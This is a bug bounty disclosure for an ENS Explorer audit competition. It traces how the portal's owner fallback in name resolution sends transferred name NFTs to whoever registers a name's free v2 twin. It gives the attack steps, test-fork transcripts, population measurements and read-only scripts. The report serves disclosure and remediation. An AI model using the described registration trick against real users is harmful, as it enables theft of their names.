# 91900 w a critical explorer resolves a recipient ens name that has no addr 60 record to the owner of its ens v2 registry entry so one ordinary paid v2 registration by a stranger redirects a nam&#x20;

**Submitted on Sep 5th 2026 at 11:34:54 UTC by @br0nz3p1ck4x3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91900
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Direct theft of user NFTs

## Description

## Summary

`apps/portal/src/utils/ens/resolveEnsOwner.ts:72-105` resolves a `.eth` name by trying ENS v2 FIRST and only falling through to ENS v1 when the v2 lookup is empty (`:83-92`):

```tsx
if (tld === 'eth' && labels.length >= 2) {
  const v2 = await resolveV2EthOwner(client, name)
  if (v2) {
    return {
      owner: v2.owner,
      registryAddress: v2.registryAddress,
      protocolVersion: 'ENSv2',
    }
  }
}
```

`apps/portal/src/features/roles/helpers/addUser.handlers.ts:11-40` is `resolveAddressOrName`, the function behind every "name or address" field in the Explorer. It asks the UniversalResolver for `addr(60)`, and when there is no `addr(60)` record it falls back to that owner lookup and returns the OWNER of the name's registry entry as if it were the name's address. Verbatim, `addUser.handlers.ts:25-34`:

```tsx
let resolvedAddress = resolved

// Fallback for names that do not set an address record:
// use current ENS owner address so the role can still be granted.
if (!resolvedAddress) {
  const ownerResult = await getEnsOwner({ name: nameOrAddress })
  if (ownerResult.isOk()) {
    resolvedAddress = ownerResult.value?.owner ?? null
  }
}
```

Combine the two and you get: for a live ENS v1 `.eth` name that publishes no `addr(60)` record and whose label is still FREE in the v2 `.eth` registry, whichever address holds the v2 entry is the address the Explorer derives from that name. Since the label is free, a stranger can take that position with one ordinary, fully paid v2 registration.

The comment says "so the role can still be granted", which is the add-user use case. But the value does not stay in the roles feature. The exact chain, grepped end to end:

| File:line                                                                  | Code                                                                                                                                                 |
| -------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| `apps/portal/src/features/transfer/components/SendNameForm.tsx:81-82`      | `const resolution = useAddressResolution(recipientInput)` then `const { address: recipient, isResolving } = resolution`                              |
| `apps/portal/src/features/address/hooks/useAddressResolution.ts:47, 60-61` | defines the hook; runs `getResolvedAddressQueryOptions({ nameOrAddress: debounced })`                                                                |
| `apps/portal/src/features/address/queries/getResolvedAddress.ts:26-29`     | `const address = await resolveAddressOrName({ client, nameOrAddress: params.nameOrAddress })`                                                        |
| `apps/portal/src/features/transfer/components/SendNameForm.tsx:107-108`    | `if (!recipient \|\| !canStart) return` then `startTransfer({ recipient, options: effectiveOptions })`                                               |
| `apps/portal/src/features/transfer/hooks/useTransferName.ts:143`           | `transferToken({ ...common, registryAddress, tokenId, recipient, id })`                                                                              |
| `apps/portal/src/features/transfer/helpers/transferToken.ts:67-71`         | `encodeFunctionData({ abi: erc1155Abi, functionName: 'safeTransferFrom', args: [walletWithAccount.account.address, recipient, tokenId, 1n, '0x'] })` |
| `apps/portal/src/features/transfer/helpers/transferToken.ts:79`            | `to: registryAddress`                                                                                                                                |

Reach, counted rather than asserted: `resolveAddressOrName` has exactly ONE caller repo-wide, `getResolvedAddress.ts:26` (`rg` over `apps/portal/src` returns that call site plus the definition, the import, and one comment reference). `getResolvedAddress` feeds `useAddressResolution`, which has FIVE call sites: the transfer recipient (`SendNameForm.tsx:81`), the create-subname owner (`routes/$name/create-subname.tsx:109`), and the three add-user sheets (`RolesAddUserSheet.tsx:73`, `RegistryAddUserSheet.tsx:66`, `ResolverAddUserSheet.tsx:141`). The transfer recipient is the one this report exploits, because that is the one where an ERC-1155 moves.

The victim's name and the recipient name are unrelated. The attacker does not need to control, touch, or even look at the victim's name. They need only to be the party a recipient name resolves to.

The printed on-chain result, from the PoC transcript reproduced in full below (`poc/transcript-04-partB.txt`):

```
balanceOf(victim   0x345929dc2E57817C16AEDc65f5e0cF2817299406, tokenId) = 1
balanceOf(attacker 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7, tokenId) = 0
... victim signs the transaction apps/portal/src/features/transfer/helpers/transferToken.ts:67-71 builds ...
balanceOf(victim   0x345929dc2E57817C16AEDc65f5e0cF2817299406, tokenId) = 0
balanceOf(attacker 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7, tokenId) = 1
NFT STOLEN: true
```

The token is the ERC-1155 for the victim's real ENS v2 name `stronghold.eth` in the ETHRegistry at `0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2`, token id `38424076124039839195221280089598108906984212041120748309434213820982934634496`. It moves to an attacker who owns nothing of the victim's, holds no role over the victim's name, and never touched the v1 registry.

***

## Why this row and not the display row, stated first because it is the honest weakness

The transfer form DOES render the resolved recipient address, in full and untruncated.

`apps/portal/src/features/transfer/components/SendNameForm.tsx:248-249`:

```tsx
.with({ recipient: P.nonNullable }, ({ recipient }) => (
  <RecipientPreview address={recipient} />
```

`SendNameForm.tsx:253` declares `RecipientPreview`, and at `:276-281` it renders:

```tsx
<CopyableRecord
  value={address}
  displayValue={address}
  textClassName="text-muted-foreground sm:text-xs"
  truncate={false}
/>
```

A victim who has the intended recipient's hex address in front of them, out of band, and compares it character by character will catch this.

That is precisely why this report does not claim the row "Causing the application to display or pre-fill an incorrect address, name, or transaction detail...". Nothing on screen contradicts what the app does: the app derives address X from the typed name and shows address X. The defect is in the derivation, not the display, and the harm the derivation produces is that the victim's name token ends up in a stranger's wallet. *Direct theft of user NFTs* needs nothing from the display surface at all, so the concession above costs the claim nothing. It is led with rather than defended later.

Rows explicitly NOT claimed, so a reviewer does not answer a clause never made:

| Row                                                                                                                                                                                   | Why it is not claimed                                                                                                                                                                                                                                                                                                         |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| "Causing the application to display or pre-fill an incorrect address, name, or transaction detail... resolving or rendering an ENS name to an attacker-controlled address" (Critical) | Its first sub-bullet is literally satisfied, and the PoC prints the resolution flipping to the attacker. Not claimed anyway: on this program a report that needs the confirmation surface to be wrong is closed when the surface is right, and here it is right.                                                              |
| "Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer)... redirecting the recipient of a name transfer" (Critical)                  | The second sub-bullet is this finding word for word, but the row's own qualifier is "during a Manager flow" and this is the Explorer (`apps/portal`). Named here so the choice is visible; if triage prefers to move the finding to this row, nothing in the report changes.                                                  |
| "Malicious interactions with an already-connected wallet... Modifying transaction arguments or parameters" (Critical)                                                                 | It fits, since the recipient argument is not the party the victim named, but it describes the mechanism where the NFT row describes the realized loss, and the PoC reaches the loss. Its sibling sub-bullet "Inducing a blanket token approval... to an attacker-controlled address" is not claimed: no approval is involved. |
| "Direct theft of user funds" (Critical)                                                                                                                                               | Not claimed: no funds move, the asset is the name token.                                                                                                                                                                                                                                                                      |
| "Taking state-modifying authenticated actions... on behalf of other users without any interaction by that user" (Critical)                                                            | Not claimed: the victim signs.                                                                                                                                                                                                                                                                                                |
| Every availability row, and "Taking down the application/website"                                                                                                                     | Not claimed: nothing here is availability, and DoS is excluded.                                                                                                                                                                                                                                                               |

***

## Impact

An attacker with no relationship to the victim, no role on the victim's name, and no ability to make the victim do anything unusual:

1. picks a live v1 `.eth` name that publishes no `addr(60)` record and whose label is still free in the v2 `.eth` registry. On the pinned Sepolia fork the PoC used `pieslicer.eth`. See the population section for how many such names exist and for the limits of that measurement.
2. makes one ordinary, fully paid v2 registration of that label: commit, wait `MIN_COMMITMENT_AGE`, register. Cost on the fork: 8.000021 test USDC. The attacker sets subregistry `0x0` and resolver `0x0`, so they publish no records at all.
3. waits. There is no further attacker action.

Any Explorer user who then types that name into the transfer recipient field gets the attacker's address, and their name token goes to the attacker.

What the attacker never does: touch the v1 registry, touch the victim, touch the victim's name, obtain a role, or send the victim anything. The v1 owner of the recipient name is collaterally affected in that their name now points at a stranger, but they lose nothing directly; the loss lands on whoever transfers a name to them.

And the defect does not even need him. On live Sepolia at head today, with no attacker, no fork and no bait, 14 of 317 sampled live v1 2LD labels are already registered in the v2 registry to an address different from their v1 owner, and three of those (`hello.eth`, `arthy.eth`, `reposado.eth`) publish no `addr(60)`, so the shipped `resolveAddressOrName` already returns the v2 holder instead of the v1 registrant for them. That measurement, its addresses and its repro commands are in the section "The same defect already misfires on live Sepolia today, with no attacker at all" below. The attacker's registration in this PoC does not create the defect; it selects who benefits from one that is already misfiring.

***

## Root cause

| File:line                                                                      | Code / behaviour                                                                                                    |
| ------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------- |
| `apps/portal/src/features/roles/helpers/addUser.handlers.ts:11-40`             | `resolveAddressOrName`: address passes through; a name goes to `getEnsAddress` with `universalResolverAddress`      |
| `apps/portal/src/features/roles/helpers/addUser.handlers.ts:29-34`             | THE DEFECT. No `addr(60)` leads to `getEnsOwner` and the registry owner is returned as the address                  |
| `apps/portal/src/utils/ens/resolveEnsOwner.ts:72-105`                          | `resolveEnsOwner`: v2 first for `.eth`, v1 only as fallback, null if neither                                        |
| `apps/portal/src/utils/ens/resolveEnsOwner.ts:83-92`                           | the v2-before-v1 branch, which makes the substituted owner the v2 registrant rather than the name's real v1 owner   |
| `apps/portal/src/features/address/queries/getResolvedAddress.ts:26-29`         | the one caller of `resolveAddressOrName`; its own doc comment at `:14-17` states the fallback as intended behaviour |
| `apps/portal/src/features/address/hooks/useAddressResolution.ts:47, 60-61`     | the shared hook behind all five "name or address" fields                                                            |
| `apps/portal/src/features/transfer/components/SendNameForm.tsx:81-82, 107-108` | transfer recipient comes from that hook and is handed to `startTransfer`                                            |
| `apps/portal/src/features/transfer/hooks/useTransferName.ts:143`               | `transferToken({ ...common, registryAddress, tokenId, recipient, id })`                                             |
| `apps/portal/src/features/transfer/helpers/transferToken.ts:67-71`             | `encodeFunctionData` for ERC-1155 `safeTransferFrom` with that recipient                                            |
| `apps/portal/src/features/transfer/helpers/transferToken.ts:79`                | the transaction is sent to `registryAddress`                                                                        |
| `apps/portal/src/utils/token/isNameOrAddress.ts:18-22`                         | the sibling that gets it right for one input shape, and names the fallback while doing so                           |

### The one file:line that must change

```
apps/portal/src/features/roles/helpers/addUser.handlers.ts:29-34
```

That is the fallback. A name with no `addr(60)` record has no address; returning the owner of a registry entry that a stranger may have just bought is the defect. Removing that substitution, or gating it so it can never reach a value-moving field, fixes this finding, and nothing else in this report is required.

The contributing line, which is why the substituted owner is a stranger rather than the name's real owner, is `apps/portal/src/utils/ens/resolveEnsOwner.ts:83-92`: v2 is consulted before v1, so an empty-record v1 name whose label is free in v2 answers with the v2 holder.

### The sibling in this repo that gets it right

The repo already knows this fallback over-resolves, and has already patched one narrow case of it, by name. `apps/portal/src/utils/token/isNameOrAddress.ts:18-22`, verbatim:

```tsx
 * The name must have at least two labels (i.e. contain a `.`). A bare
 * single label like `fox` is a valid ENS name string but not a resolvable
 * account — only TLDs are single-label — and would otherwise "resolve" via the
 * owner fallback in `resolveAddressOrName`.
```

That is the correct instinct, applied to exactly one input shape. "A name that publishes no address record is not a resolvable account" is the same statement, and it is not made anywhere. `isNameOrAddress` happily accepts `pieslicer.eth`, which is ENSIP-15 normalized and has two labels, and the fallback then invents an address for it.

The second sibling is inside the defective function itself. The path `resolveAddressOrName` tries FIRST, the UniversalResolver `addr(60)` lookup at `addUser.handlers.ts:20-23`, is correct: when an `addr(60)` record exists the fallback is never reached and the record wins. The PoC's read-only control (R5, `gomets.eth`) prints it:

```
UR addr(60)                = 0x4395BEeC5b4E42d598d55a4bA4EBb04Cc9b58481
app resolveAddressOrName() = 0x4395BEeC5b4E42d598d55a4bA4EBb04Cc9b58481
the owner fallback is not reached at all when addr(60) exists.
```

So the correct code is the if-branch of the same function and the defect is only the else-branch: instead of "this name does not publish an address, stop", it invents one from registry ownership.

***

## Every confirmation surface, quoted

Nothing here is a display defect, and the claim does not need one, but every surface was opened and is quoted rather than summarised.

**Warning banner above the field**, `SendNameForm.tsx:113-119`:

```
Transferring ownership of an ENS name is irreversible. Make sure you
check the recipient address before proceeding.
```

The app tells the user to check the address. The address is the attacker's, and checking it against the NAME the user typed tells them nothing, because the app is the thing that made the association.

**Recipient field**, `SendNameForm.tsx:123-135`: `AddressNameInput` with `value={recipientInput}`. The name is echoed exactly as typed. Correct.

**Resolved-address line.** `AddressNameInput`'s default status line is `apps/portal/src/features/address/components/AddressNameInput.tsx:62-67`, `` `Resolved: ${truncateAddress(address, 6, 4)}` ``, but the transfer form overrides it via `resolvedContent` (`SendNameForm.tsx:128-134`), so the transfer form shows `RecipientPreview` instead.

**RecipientPreview**, `SendNameForm.tsx:249` and `:253-285`: renders the resolved hex address IN FULL, `truncate={false}` at `:280`. This is the true address the calldata will carry, and it is the attacker's. Above it, `:271-275` renders the address's own primary name if it has one; a fresh attacker EOA has none, so that line is absent.

**Transaction step titles.** `apps/portal/src/features/transfer/utils/buildTransferPlan.ts:45-50`:

```tsx
export const STEP_LABELS: Record<TransferStepKind, string> = {
  'set-eth-addr': 'Update ETH address',
  'detach-resolver': 'Detach resolver',
  'detach-registry': 'Detach registry',
  'transfer-token': 'Transfer name',
}
```

and `useTransferName.ts:176-177`:

```tsx
title: STEP_LABELS[step],
transactionName: `${STEP_LABELS[step]} - ${name}`,
```

`name` here is the name being SENT, the victim's own. The modal is correct about the asset and says nothing about the recipient.

**Transaction description**, `transferToken.ts:88`: `` description: `Transfer ${name}` ``. Again the sent name, not the recipient.

**Wallet prompt**: an EOA transaction (`transferToken.ts:76-84`, type `'eoa'`, `to: registryAddress`, `value: 0n`) to `0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2` carrying selector `0xf242432a`, which decodes to `safeTransferFrom(from=victim, to=0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7, id=38424076124039839195221280089598108906984212041120748309434213820982934634496, amount=1, data=0x)`. The recipient hex in the wallet prompt is the same attacker address the page displayed.

Every surface is consistent, and consistently pointed at the attacker. The claim is not "the app displays a different string from the one it uses". The claim is "the address the app derived from the name the victim typed belongs to a stranger who bought it for 8 USDC, and the victim's NFT goes there."

***

## The same defect already misfires on live Sepolia today, with no attacker at all

This section is here because the first thing said about a finding like this one is "the attacker sets bait and hopes". He does not have to. The same code path is already handing out the wrong address, right now, on the live deployment, for names no attacker in this report ever touched.

All reads below are against live Sepolia (`https://ethereum-sepolia-rpc.publicnode.com`), read-only, at head \~11637762. No fork, no writes, no attacker, no impersonation.

317 live (unexpired), ASCII, deduped v1 `.eth` 2LD labels were sampled from the newest 3000 v1 registrations, and for each the question asked was whether the label is ALSO registered in the v2 `.eth` registry to a DIFFERENT address than its v1 owner:

```
collisions (v1 owner != v2 owner): 14 of 317   readErrors 0
```

Of those 14, three publish NO `addr(60)` record, so the shipped `resolveAddressOrName` takes the owner fallback at `addUser.handlers.ts:29-34` and returns the V2 holder, a party who is not the v1 owner and who did nothing wrong:

```
name           v1 registrant                               v2 owner (what the app returns)             UR addr(60)
hello.eth      0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750  0x1D84ad46F1ec91b4Bb3208F645aD2fA7aBEc19f8  null
arthy.eth      0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750  0x0aB34352B087a107302aFF5d155e23a11637Caa1  null
reposado.eth   0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750  0x74aFE736cF607713bB6aee246b1CB80D6441237c  null
```

Re-run through the shipped resolution order (viem `getEnsAddress` with the app's `universalResolverAddress`, then `resolveEnsOwner` v2-before-v1), live:

```
hello.eth
  UR addr(60)          = null
  resolveEnsOwner      = {"owner":"0x1D84ad46F1ec91b4Bb3208F645aD2fA7aBEc19f8",
                          "registryAddress":"0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2",
                          "protocolVersion":"ENSv2"}
  resolveAddressOrName = 0x1D84ad46F1ec91b4Bb3208F645aD2fA7aBEc19f8
arthy.eth      -> 0x0aB34352B087a107302aFF5d155e23a11637Caa1
reposado.eth   -> 0x74aFE736cF607713bB6aee246b1CB80D6441237c
```

So TODAY, on the live deployment, with no attacker in the picture, a user who types `hello.eth` into the Explorer's transfer recipient field and sends their name sends it to `0x1D84ad46F1ec91b4Bb3208F645aD2fA7aBEc19f8`, while the party who holds `hello.eth` in the registry the user is thinking of is `0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750`. The bug is not a trap an attacker has to lay; it is the app's default behaviour on 3 of 317 sampled live names (0.95%), sitting there right now.

That reframes the attacker in this report's PoC. His one ordinary paid v2 registration is not the cause of the defect. It is one way of SELECTING who benefits from a defect that already misfires without him, on names he never registered, on the deployment as it stands.

Exact repro (read-only, no fork; scripts written to `/tmp/ensverify`):

```bash
cd /tmp/ensverify && node adv-collide.mjs          # finds the 14 collisions
cd /tmp/ensverify && NAMES=hello.eth,arthy.eth,reposado.eth node adv-check.mjs
cd /tmp/ensverify && node adv-check2.mjs           # isAvailable + both registries
```

These three scripts are reproduced in full below so the numbers in this section can be re-derived rather than taken on trust.

#### `adv-collide.mjs`

```js
import { createPublicClient, http, zeroAddress } from 'viem'
import { sepolia } from 'viem/chains'
import { getEnsAddress } from 'viem/actions'
import { extendChainWithEns, getChainContractAddress } from '@ensdomains/ensjs/chain'
import { getOwner as getOwnerV1 } from '@ensdomains/ensjs/public/v1'
import { getOwner as getOwnerV2 } from '@ensdomains/ensjs/public/v2'
const chain = extendChainWithEns(sepolia)
const pub = createPublicClient({ chain, transport: http('https://ethereum-sepolia-rpc.publicnode.com'), batch:{multicall:true} })
const UR = getChainContractAddress({chain,contract:'ensUniversalResolver'})
const SG='https://v1-graphql.ens.dev/subgraph'
async function page(skip){
  const q=`{registrations(first:1000,skip:${skip},orderBy:registrationDate,orderDirection:desc){labelName expiryDate registrant{id}}}`
  const r=await fetch(SG,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({query:q})})
  const j=await r.json(); if(j.errors) throw new Error(JSON.stringify(j.errors).slice(0,200))
  return j.data.registrations
}
const now=Math.floor(Date.now()/1000)
let labels=new Map()
for(let p=0;p<3;p++){
  const rows=await page(p*1000)
  for(const r of rows){ if(!r.labelName) continue; if(Number(r.expiryDate)<now) continue; if(!/^[a-z0-9-]+$/.test(r.labelName)) continue; if(!labels.has(r.labelName)) labels.set(r.labelName, r.registrant.id) }
  if(rows.length<1000) break
}
const arr=[...labels.entries()].slice(0,400)
console.log('checking',arr.length,'live v1 labels for a natural v1/v2 owner collision')
let coll=[],err=0
for(let i=0;i<arr.length;i+=20){
  const batch=arr.slice(i,i+20)
  await Promise.all(batch.map(async ([label,v1reg])=>{
    const name=label+'.eth'
    try{
      const v2=await getOwnerV2(pub,{name})
      if(v2 && v2!==zeroAddress){
        const v1=(await getOwnerV1(pub,{name}))?.owner
        if(v1 && v1!==zeroAddress && v1.toLowerCase()!==v2.toLowerCase()){
          const ur=await getEnsAddress(pub,{name,universalResolverAddress:UR}).catch(()=>null)
          coll.push({name,v1,v2,ur})
        }
      }
    }catch(e){err++}
  }))
  if(i%100===0) process.stdout.write(`  ...${i}\n`)
}
console.log('collisions (v1 owner != v2 owner):',coll.length,'readErrors',err)
for(const c of coll.slice(0,15)) console.log(' ',c.name,'v1',c.v1,'v2',c.v2,'UR addr(60)',c.ur)
```

#### `adv-check.mjs`

```js
import { createPublicClient, http, zeroAddress, namehash, labelhash } from 'viem'
import { sepolia } from 'viem/chains'
import { getEnsAddress } from 'viem/actions'
import { extendChainWithEns, getChainContractAddress } from '@ensdomains/ensjs/chain'
import { getOwner as getOwnerV1 } from '@ensdomains/ensjs/public/v1'
import { getNameRegistries, getOwner as getOwnerV2 } from '@ensdomains/ensjs/public/v2'

const RPC = process.env.RPC || 'https://ethereum-sepolia-rpc.publicnode.com'
const chain = extendChainWithEns(sepolia)
const pub = createPublicClient({ chain, transport: http(RPC) })
const C = (n) => getChainContractAddress({ chain, contract: n })
const ADDR = {
  ur: C('ensUniversalResolver'), reg: C('ensRegistry'), registrar: C('ensEthRegistrar'),
  legacy: C('ensLegacyRegistry'),
}
console.log('block', await pub.getBlockNumber())
console.log('ADDR', ADDR)

async function resolveEnsOwner(name){
  const labels = name.split('.')
  if (labels[labels.length-1]==='eth' && labels.length>=2){
    const [o, r] = await Promise.all([getOwnerV2(pub,{name}).catch(e=>{throw e}), getNameRegistries(pub,{name})])
    if (o && o!==zeroAddress){
      const ra = r[1]
      if (ra && ra!==zeroAddress) return {owner:o, registryAddress:ra, protocolVersion:'ENSv2'}
    }
  }
  const v1 = await getOwnerV1(pub,{name})
  if (v1?.owner && v1.owner!==zeroAddress) return {owner:v1.owner, registryAddress:ADDR.legacy, protocolVersion:'ENSv1'}
  return null
}
async function resolveAddressOrName(name){
  try {
    const resolved = await getEnsAddress(pub,{name, universalResolverAddress: ADDR.ur})
    let a = resolved
    if (!a){ const o = await resolveEnsOwner(name); a = o?.owner ?? null }
    return a
  } catch(e){ console.log('  THREW:', e.shortMessage||e.message); return null }
}
const names = (process.env.NAMES||'pieslicer.eth,degens.eth,thealliance.eth,studio.eth,gomets.eth').split(',')
for (const n of names){
  const label = n.split('.')[0]
  let avail=null
  try { avail = await pub.readContract({address:ADDR.registrar, abi:[{name:'available',type:'function',stateMutability:'view',inputs:[{type:'string'}],outputs:[{type:'bool'}]}], functionName:'available', args:[label]}) } catch(e){ avail = 'ERR:'+(e.shortMessage||e.message).slice(0,60) }
  let ur=null; try { ur = await getEnsAddress(pub,{name:n, universalResolverAddress:ADDR.ur}) } catch(e){ ur='THREW:'+(e.shortMessage||e.message).slice(0,80) }
  const own = await resolveEnsOwner(n)
  const raon = await resolveAddressOrName(n)
  console.log(`\n${n}\n  registrar.available = ${avail}\n  UR addr(60)        = ${ur}\n  resolveEnsOwner    = ${JSON.stringify(own)}\n  resolveAddressOrName = ${raon}`)
}
```

#### `adv-check2.mjs`

```js
import { createPublicClient, http, zeroAddress } from 'viem'
import { sepolia } from 'viem/chains'
import { extendChainWithEns, getChainContractAddress } from '@ensdomains/ensjs/chain'
import { getOwner as getOwnerV1 } from '@ensdomains/ensjs/public/v1'
import { getOwner as getOwnerV2, getNameRegistries } from '@ensdomains/ensjs/public/v2'
const chain = extendChainWithEns(sepolia)
const pub = createPublicClient({ chain, transport: http('https://ethereum-sepolia-rpc.publicnode.com') })
const C=(n)=>getChainContractAddress({chain,contract:n})
const registrar=C('ensEthRegistrar')
const abiIsAvail=[{name:'isAvailable',type:'function',stateMutability:'view',inputs:[{name:'label',type:'string'}],outputs:[{type:'bool'}]}]
const names=(process.env.NAMES||'pieslicer.eth,degens.eth,thealliance.eth,studio.eth,stronghold.eth,gomets.eth').split(',')
for(const n of names){
  const label=n.split('.')[0]
  let av; try{ av=await pub.readContract({address:registrar,abi:abiIsAvail,functionName:'isAvailable',args:[label]})}catch(e){av='ERR '+(e.shortMessage||e.message).slice(0,50)}
  let v1,v2
  try{ v1=(await getOwnerV1(pub,{name:n}))?.owner }catch(e){v1='ERR'}
  try{ v2=await getOwnerV2(pub,{name:n}) }catch(e){v2='ERR '+(e.shortMessage||'').slice(0,40)}
  console.log(`${n.padEnd(18)} isAvailable=${String(av).padEnd(6)} v1Owner=${v1} v2Owner=${v2}`)
}
```

`adv-check.mjs` transliterates `resolveEnsOwner` (v2 first for `.eth` with >=2 labels, then v1) and `resolveAddressOrName` (`getEnsAddress` with `universalResolverAddress`, then the owner fallback) from `apps/portal`, using `extendChainWithEns(sepolia)` for every contract address, the same as the PoC's `lib.mjs`. `adv-collide.mjs` takes its label frame from `https://v1-graphql.ens.dev/subgraph` (out of scope as an asset, used only to pick which names to read) and reads every fact from chain.

Caveat, stated because it was measured and must not be overstated: it was NOT verified that the 14 collisions arose innocently rather than adversarially. What is measured is that the v1 registrant and the v2 owner are different addresses and that the app returns the v2 one. That is enough for the "no attacker required" point; it is not upgraded here to "these were accidental".

***

## Population: how many recipient names are exploitable, measured, with its limits

A name is an exploitable recipient only when BOTH hold: (a) the UniversalResolver returns no `addr(60)`, so the fallback fires, and (b) the label is FREE in the v2 `.eth` registry (`getStatus == 0` and `ETHRegistrar.isAvailable == true`), so a stranger can register the twin. Both facts are read from the fork, not from an indexer.

Measured on a frame of 5306 live, deduped v1 `.eth` 2LD labels from 1129 distinct registrants (registration dates 2024-04-03 to 2026-08-30):

* RAW sample: 18 of 350 exploitable, 5.1%, with 1 distinct registrant among the exploitable set.
* PER-OWNER sample (at most one label per distinct registrant): 0 of 350 exploitable, 0.0%.
* By registration-date decile: every exploitable label falls in decile 10 (2026-05-20 to 2026-08-30), 12 of 25 = 48%.
* The frame is skewed: the top registrant holds 2002 of 5306 labels, 37.7%. That skew is NOT corrected for in the RAW row.

Read as a date rule rather than a percentage of a skewed frame, across 400 live v1 labels registered on or after 2026-01-01:

```
month    n    free(0) reserved(1) registered(2)  noAddr  EXPLOITABLE  registrants
2026-05     8       0          5            3       1           0           0
2026-06   108       0        108            0     107           0           0
2026-07    14       0         13            1      12           0           0
2026-08   270     256          1           13     259         256           1

earliest exploitable registrationDate 2026-08-20; latest reserved registrationDate 2026-08-06.
```

So the exploitable set is the newest cohort: v1 names registered after the v2 reservation snapshot was taken are not reserved in v2, so their v2 twins are free and anyone can buy them.

"1 distinct registrant among the exploitable set" is not a narrowing condition on the bug. The control (02c) counts, from the subgraph alone, how many distinct addresses registered any live v1 name per month: 2026-08, the only exploitable month, has 270 live labels from just 2 distinct registrants in total, whereas other months range from 1 to 255. The exploitable set has one registrant because the month has two. The reading that the v2 registry decides free-versus-reserved from a pre-migration reservation snapshot which has no knowledge of the registrant is an interpretation of the `getStatus` data, not a separate measurement, and is labelled as such.

Honest limit, stated rather than buried: this is a testnet population at one fork block, sampled from an out-of-scope subgraph, and it is narrow and concentrated. What it establishes is that the exploitable set is non-empty and is exactly the post-snapshot cohort. It does not establish a mainnet prevalence figure, and none is claimed.

***

## Recovery, enumerated and run

Working recovery is conceded first. If the recipient name already publishes an `addr(60)` record, the fallback is never reached and there is nothing to exploit (control R5, `gomets.eth`). And if the recipient name's label is RESERVED in v2 rather than free, the name's v1 owner CAN defend by publishing `addr(60)`: the controlled 2x2 in `07-mitigation-matrix.mjs` shows `studio.eth` (v2 `getStatus` 1) accepting the record, with both the UniversalResolver and the app honouring it.

Every other recovery route was executed, not asserted, after the token was already in the attacker's hands:

| Route                                                                                   | Result                                                                                                                                                                                                                                                                                                                                                                                                                                |
| --------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| R1. Victim signs `safeTransferFrom(attacker -> victim)`                                 | The transaction REVERTS and balances do not move: victim 0, attacker 1. The transcript records "status reverted" with a tx hash and no decoded revert reason, so no specific reason is attributed to it here.                                                                                                                                                                                                                         |
| R2. Does the victim retain any role on the token?                                       | `roles(tokenId, victim) = 0x0`; `roles(tokenId, attacker) = 0x1110000000000000000000000000000001100000`. The victim holds nothing.                                                                                                                                                                                                                                                                                                    |
| R3. The recipient name's real v1 owner publishes `addr(60)` AFTER the attack            | `setResolver` and `setAddr` both succeed and `PublicResolver.addr(node)` reads back, but the UniversalResolver still answers null, `resolveAddressOrName` still answers the attacker, and the stolen token does not come back (victim 0, attacker 1).                                                                                                                                                                                 |
| R4 / 07. The same mitigation applied BEFORE any attack, on a currently exploitable name | Using a sentinel address `0x...DeaDBeef` deliberately different from the owner so "record honoured" and "owner fallback fired" cannot be confused: for the v2-FREE name `thealliance.eth` the record IS stored on chain, but UR `addr(60)` = null and the app still returns the owner fallback. `record honoured = false`. Since v2-FREE is exactly the exploitable set, the owner of an exploitable name has NO addr-record defence. |
| R6. The attacker's v2 entry                                                             | status 2 (registered), expiry 1820091752 (2027-09-04), `latestOwner` the attacker. The v1 owner cannot revoke or reclaim it, and nothing about it returns the stolen token.                                                                                                                                                                                                                                                           |

Net: once the transfer mines there is no in-app and no on-chain recovery. The only party who can return the name is the attacker.

## Preempting the likely closure arguments

**"The user can see the address."** Conceded, and led with. The address rendered is the address used. The row claimed does not require a false display; it requires the victim's NFT to end up with an attacker, which the balances print.

**"The victim chose to transfer a name."** Yes, and that is the flow the route exists for. The victim types the name of the party they intend to send to. Everything after that, the resolution and the calldata, is the app's work. There is no second feature the victim must independently discover, no bait token pushed at them, and no interaction with the attacker at any point.

**"The recipient name's owner should publish an addr record."** Measured, and it is not available to them. 07's 2x2 shows that for exactly the exploitable set, labels FREE in v2, the record is stored on chain but the UniversalResolver does not serve it and the app keeps taking the owner fallback: `record honoured = false`. For the non-exploitable set, labels RESERVED in v2, the record does work, and those names are not attackable anyway. Beyond that it is a mitigation belonging to an uninvolved third party, and it does not return a token already stolen (R3: victim 0, attacker 1, after the record is published).

**"The fallback is intentional, the comment says so."** The comment at `addUser.handlers.ts:27-28` says "so the role can still be granted", which is the add-user use case. The function has one caller, `getResolvedAddress.ts:26`, feeding one hook, `useAddressResolution`, feeding five fields, one of which moves an ERC-1155. Intent for the roles field is not intent for the transfer field, and the repo already shows awareness that this fallback over-resolves: `isNameOrAddress.ts:18-22` patches the single-label case by name.

